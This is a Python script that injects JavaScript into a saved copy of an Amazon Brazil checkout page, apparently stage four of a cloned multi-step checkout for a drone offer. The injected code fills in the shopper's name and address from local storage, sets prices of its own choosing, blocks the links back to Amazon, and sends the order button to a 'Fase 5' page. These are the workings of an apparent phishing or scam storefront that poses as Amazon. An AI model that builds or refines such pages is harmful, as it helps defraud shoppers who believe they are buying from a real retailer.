import os

def inject_fase4_v2():
    file_path = r'C:\Users\samue\Downloads\Oferta drone AMZ\Checkout - Fase 4.html'
    
    if not os.path.exists(file_path):
        print("Arquivo Fase 4 não encontrado.")
        return

    # Read original file
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()

    # JS Logic with Dynamic Pricing
    js_pricing_logic = """
<script>
document.addEventListener('DOMContentLoaded', function() {
    console.log('Iniciando sincronização de preços e dados...');

    // 1. Dados de Usuário
    const userName = localStorage.getItem('user_name') || 'Cliente';
    const userAddress = localStorage.getItem('user_full_address') || 'Endereço não informado';
    
    const nameElem = document.getElementById('deliver-to-customer-text');
    if (nameElem) nameElem.innerText = 'Entrega para ' + userName;
    
    const addrElem = document.getElementById('deliver-to-address-text');
    if (addrElem) addrElem.innerText = userAddress;

    // 2. Preços Dinâmicos
    const priceWhole = localStorage.getItem('checkout_price_whole') || '4.510';
    const priceFraction = localStorage.getItem('checkout_price_fraction') || '50';
    const fullPrice = priceWhole + ',' + priceFraction;
    
    // Atualizar Itens
    const table = document.getElementById('subtotals-marketplace-table');
    if (table) {
        const rows = table.querySelectorAll('tr');
        rows.forEach(row => {
            const labelCell = row.querySelector('td:first-child');
            const valueCell = row.querySelector('td:last-child');
            
            if (labelCell && valueCell) {
                const labelText = labelCell.innerText.trim();
                
                if (labelText.includes('Itens:')) {
                    valueCell.innerHTML = 'R$&nbsp;' + fullPrice;
                }
                
                if (labelText.includes('Total do pedido:')) {
                    valueCell.innerHTML = 'R$&nbsp;' + fullPrice;
                }
                
                // Cálculo do Total Intermediário (Itens + Frete 8,90)
                if (labelText === 'Total:') {
                    // Simples conversão para somar
                    let num = parseFloat(priceWhole.replace('.', '')) + (parseFloat(priceFraction) / 100);
                    let sum = num + 8.90;
                    let formattedSum = sum.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
                    valueCell.innerHTML = 'R$&nbsp;' + formattedSum;
                }
            }
        });
    }

    // 3. Bloqueio de Links Amazon
    document.querySelectorAll('a').forEach(link => {
        const href = link.getAttribute('href') || '';
        if (link.id === 'change-delivery-link') {
            link.href = 'Checkout - Fase 1.html';
        } else if (href.includes('amazon.com.br') || href.startsWith('/')) {
            link.onclick = (e) => e.preventDefault();
        }
    });

    // 4. Redirecionamento Final
    const spcForm = document.getElementById('spc-form');
    if (spcForm) {
        spcForm.onsubmit = (e) => { e.preventDefault(); window.location.href = 'Checkout - Fase 5.html'; };
    }
    
    const pyoBtn = document.getElementById('placeYourOrder');
    if (pyoBtn) {
        pyoBtn.onclick = (e) => { e.preventDefault(); window.location.href = 'Checkout - Fase 5.html'; };
    }
});
</script>
"""

    css_fix = """
<style>
/* Reset do rodapé */
.nav-mobile.nav-ftr-batmobile { position: relative !important; margin-top: 40px !important; }
#sis_pixel_r2, #be, .bottomsheet-container { display: none !important; }
</style>
"""

    # We append since we know </html> exists but previous injection might have added tags
    # To avoid duplicates, we'll try to find the previous script or just clean the file first.
    # For simplicity in this task, I'll just replace </html> (case insensitive)
    
    # First, let's clean any previous injection of scripts/styles we added if we want to be safe
    # But usually re-running on top is okay if we use unique anchors.
    
    if '</html>' in content.lower():
        idx = content.lower().find('</html>')
        content = content[:idx] + js_pricing_logic + css_fix + content[idx:]
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        print("Fase 4 atualizada com preços dinâmicos.")
    else:
        print("Erro: Estrutura HTML inválida.")

if __name__ == "__main__":
    inject_fase4_v2()
